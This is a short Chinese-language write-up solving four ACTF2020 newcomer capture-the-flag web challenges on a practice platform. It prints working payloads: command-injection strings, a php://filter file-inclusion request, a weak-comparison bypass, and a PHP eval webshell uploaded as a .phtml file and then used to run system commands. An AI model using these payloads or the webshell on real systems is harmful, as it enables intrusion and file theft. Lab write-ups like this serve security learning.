+++
title = "ACTF2020新生赛"
slug = "actf2020-newcomer-competition"
description = "刷"
date = "2024-08-11T15:02:08"
lastmod = "2024-08-11T15:02:08"
image = ""
license = ""
categories = ["复现"]
tags = ["php"]

+++

# [ACTF2020 新生赛]Exec

一个非常简单的命令执行

```
;ls /
;tac /f*
```

# [ACTF2020 新生赛]Include

随便怎么打都通,`vps`远程包含,`filter`协议等等

```
?file=php://filter/convert.base64-encode/resource=flag.php
```

# [ACTF2020 新生赛]BackupFile

题目提示直接访问`/index.php.bak`

```php
<?php
include_once "flag.php";

if(isset($_GET['key'])) {
    $key = $_GET['key'];
    if(!is_numeric($key)) {
        exit("Just num!");
    }
    $key = intval($key);
    $str = "123ffwsfwefwf24r2f32ir23jrw923rskfjwtsw54w3";
    if($key == $str) {
        echo $flag;
    }
}
else {
    echo "Try to find out source file!";
}
```

弱比较很好绕过

```
?key=123
```

# [ACTF2020 新生赛]Upload

上传`phtml`即可

```phtml
GIF89a
<script language='php'>@eval($_POST['a']);</script>
```

但是上传之后,又不行后缀被改了,看一下源码,把前端函数删了再来

```html
<form enctype="multipart/form-data" method="post" onsubmit="return checkFile()">
```

```
function checkFile() {
        var file = document.getElementsByName('upload_file')[0].value;
        if (file == null || file == "") {
            alert("请选择要上传的文件!");
            return false;
        }
        //定义允许上传的文件类型
        var allow_ext = ".jpg|.png|.gif";
        //提取上传文件的类型
        var ext_name = file.substring(file.lastIndexOf("."));
        //判断上传文件类型是否允许上传
        if (allow_ext.indexOf(ext_name) == -1) {
            var errMsg = "该文件不允许上传，请上传jpg、png、gif结尾的图片噢！";
            alert(errMsg);
            return false;
        }
    }
```

都说要删除前端,但是我没有遇到这种情况,我只遇到这种情况就是上传`phtml`后缀变成了`html`,然后我就刷了两三次靶机,终于上传成功

```
http://5f8c9914-8682-41c5-83f5-f965ac9924be.node5.buuoj.cn:81/uplo4d/2bbe77e4124ea49444bcd94bfd811898.phtml

POST:
a=system("tac /f*");
```

